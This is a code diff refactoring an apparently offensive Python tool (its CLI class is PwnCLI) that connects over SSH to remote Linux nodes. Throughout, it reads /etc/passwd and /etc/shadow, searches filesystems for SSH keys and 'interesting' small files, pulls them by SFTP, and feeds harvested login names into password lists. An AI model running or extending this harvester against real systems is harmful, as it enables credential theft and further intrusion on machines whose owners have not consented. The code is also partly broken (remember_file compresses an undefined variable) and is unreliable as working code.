@@ -74,12 +74,13 @@ class Linux(OS):
         vals = await asyncio.gather(*[getattr(self, f"get_{k}")() for k in keys])
         return dict(zip(keys, vals))
 
+
     async def collect_logins(self):
         out,_ = await self.node.run("grep -v nologin /etc/passwd;grep -v ':!:' /etc/shadow")
         logins = set(x.split(":")[0] for x in out.splitlines())
         return list(logins)
 
-    async def get_filenames(self):
+    async def collect_filenames(self):
         ## XXX Avoid smb and nfs ?
         ## uglier than find -fstype but works with busybox' find
         sout,_ = await self.node.run("awk '$3~/^(ext2|ext3|ext4|overlay|tmpfs|zfs|reiserfs|jfs|btrfs|xfs|minix|vfat|exfat|udf|ntfs|msdos|umsdos)$/{print $2}' /proc/mounts | while read a; do find $a -xdev -size -8k -print0 ; done")
@@ -88,6 +89,7 @@ class Linux(OS):
         keyfiles = set([ f[:-4] for f in pubfiles ])
         interesting_files = set([ f for f in rawfnames if self.re_interesting.search(f) ])
         return list(interesting_files|keyfiles)
+
 
 
 class Collection(object):
@@ -351,8 +353,8 @@ class Node(Mapping):
     @skip_if(States.IDENTIFIED)
     @ensure(States.CONNECTED)    
     async def ensure_IDENTIFIED(self):
-        sout,serr = await self._run("uname -o")
-        if sout.startswith("Linux"):
+        r = await self.session.run("uname -o")
+        if r.stdout.startswith("Linux"):
             self.os = Linux(self)
             self.values["os"] = "linux"
             self.state = States.IDENTIFIED
@@ -363,29 +365,8 @@ class Node(Mapping):
 
 
 
-    async def get_file(self, path):
-        async with self.session.session.start_sftp_client() as sftp:
-            f = await sftp.open(path, "rb")
-            return await f.read()
-
-    async def get_zfile(self, path):
-        content = await self.get_file(path)
-        return base64.b85encode(zlib.compress(c)).decode("ascii")
-
-    async def get_filenames(self):
-        return await self.os.get_filenames()
-
-    async def get_glob(self, pattern):
-        async with self.session.session.start_sftp_client() as sftp:
-            return await sftp.glob(pattern)
-
-
-
-
-
-    async def _run(self, cmd):
-        r = await self.session.run(cmd)
-        return r.stdout, r.stderr
+    def remember_file(self, path, content):
+        self.files[path] = base64.b85encode(zlib.compress(c)).decode("ascii")
 
     @ensure(States.CONNECTED)
     async def connect(self):
@@ -393,41 +374,62 @@ class Node(Mapping):
 
     @ensure(States.CONNECTED)
     async def run(self, cmd):
-        return await self._run(cmd)
+        r = await self.session.run(cmd)
+        return r.stdout, r.stderr
+
+    @ensure(States.CONNECTED)
+    async def glob(self, pattern):
+        async with self.session.session.start_sftp_client() as sftp:
+            return await sftp.glob(pattern)
+
+    @ensure(States.CONNECTED)
+    async def get(self, path):
+        async with self.session.session.start_sftp_client() as sftp:
+            f = await sftp.open(path, "rb")
+            content = await f.read()
+        self.remember_file(path, content)
+        return content
 
 
-    async def _sftp_get_zfile(self, sftp, fname):
+    async def _sftp_get_file(self, sftp, fname):
         f = await sftp.open(fname, "rb")
         content = await f.read()
-        return base64.b85encode(zlib.compress(content)).decode("ascii")
+        self.remember_file(fname, content)
+        return content
 
     @ensure(States.IDENTIFIED)
-    async def get_files(self, *paths):
+    async def mget(self, *paths, concurrency=10):
         async with self.session.session.start_sftp_client() as sftp:
             try:
                 lst = await sftp.glob(paths, error_handler=lambda x:None)
             except asyncssh.SFTPNoSuchFile:
                 return {}
-
-            content = await gather_limited(
-                10,
-                *(self._sftp_get_zfile(sftp, f)
+            contents = await gather_limited(
+                concurrency,
+                *(self._sftp_get_file(sftp, f)
                   for f in lst if f not in self.files),
                 return_exceptions=True)
-        d = { k:v for k,v in zip(lst, content) if type(v) is str }
-        self.files.update(d)
+        d = { k:v for k,v in zip(lst, contents) if type(v) is str }
         return d
 
-    @ensure(States.IDENTIFIED)
-    async def get_all_files(self):
+
+    async def collect_files(self):
         lst = [f.path for f in self.os.file_list]
-        return await self.get_files(*lst)
+        return await self.mget(*lst)
 
     @ensure(States.IDENTIFIED)
-    async def get_logins(self):
+    async def collect_logins(self):
         return await self.os.collect_logins()
 
+    @ensure(States.IDENTIFIED)
+    async def collect_filenames(self):
+        return await self.os.collect_filenames()
 
+    @ensure(States.IDENTIFIED)
+    async def collect_infos(self):
+        return await self.os.get_all()
+
+    
 
 
 
@@ -619,24 +621,38 @@ class PwnCLI(aiocmd.PromptToolkitCmd):
         nodes = self.cfg.nodes.select(selector)
         async def print_info(node):
             try:
-                await node.connect()
+                nfo = await node.collect_infos()
             except Exception as e:
-                print(f"------[{node.shortname}]------")
-                print(e)
+                res = e
             else:
-                nfo = await node.os.get_all()
-                print(f"------[{node.shortname}]------")
-                print(json.dumps(nfo, indent=4))
+                res = json.dumps(nfo, indent=4)
+            print(f"------[{node.shortname}]------")
+            print(res)
         await asyncio.gather(*[print_info(node) for node in nodes])
 
 
-    async def do_getfilenames(self, selector):
+    async def do_collect_logins(self, selector):
         nodes = self.cfg.nodes.select(selector)
         for node in nodes:
-            t = asyncio.create_task(node.get_filenames())
-            t.add_done_callback(lambda ctx:self.cb_get_filenames(node, ctx))
+            t = asyncio.create_task(node.collect_logins())
+            t.add_done_callback(lambda ctx: self.cb_collect_logins(node, ctx))
 
-    def cb_get_filenames(self, node, t):
+    def cb_collect_logins(self, node, t):
+        logins = t.result()
+        olog = [self.cfg.logins.mapping(config=self.cfg, login=l) for l in logins]
+        nlog = self.cfg.logins.add_batch(olog)
+        opwd = [self.cfg.passwords.mapping(config=self.cfg, password=l) for l in logins]
+        npwd = self.cfg.passwords.add_batch(opwd)
+        print(f"{node.shortname}: {nlog} new logins, {npwd} new passwords")
+
+
+    async def do_collect_filenames(self, selector):
+        nodes = self.cfg.nodes.select(selector)
+        for node in nodes:
+            t = asyncio.create_task(node.collect_filenames())
+            t.add_done_callback(lambda ctx:self.cb_collect_filenames(node, ctx))
+
+    def cb_collect_filenames(self, node, t):
         fnames = t.result()
         coll = node.os.file_list
         fnameobjects = [coll.mapping(config=self.cfg, path=p) for p in fnames]
@@ -645,31 +661,17 @@ class PwnCLI(aiocmd.PromptToolkitCmd):
 
 
 
-    async def do_getfiles(self, selector):
+    async def do_collect_files(self, selector):
         nodes = self.cfg.nodes.select(selector)
         for node in nodes:
-            t = asyncio.create_task(node.get_all_files())
-            t.add_done_callback(lambda ctx: self.cb_get_files(node, ctx))
+            t = asyncio.create_task(node.collect_files())
+            t.add_done_callback(lambda ctx: self.cb_collect_files(node, ctx))
 
-    def cb_get_files(self, node, t):
+    def cb_collect_files(self, node, t):
         files = t.result()
         print(f"{node.shortname}: retrieved {len(files)} new files")
 
 
-
-    async def do_getlogins(self, selector):
-        nodes = self.cfg.nodes.select(selector)
-        for node in nodes:
-            t = asyncio.create_task(node.get_logins())
-            t.add_done_callback(lambda ctx: self.cb_get_logins(node, ctx))
-
-    def cb_get_logins(self, node, t):
-        logins = t.result()
-        olog = [self.cfg.logins.mapping(config=self.cfg, login=l) for l in logins]
-        nlog = self.cfg.logins.add_batch(olog)
-        opwd = [self.cfg.passwords.mapping(config=self.cfg, password=l) for l in logins]
-        npwd = self.cfg.passwords.add_batch(opwd)
-        print(f"{node.shortname}: {nlog} new logins, {npwd} new passwords")
 
 
 
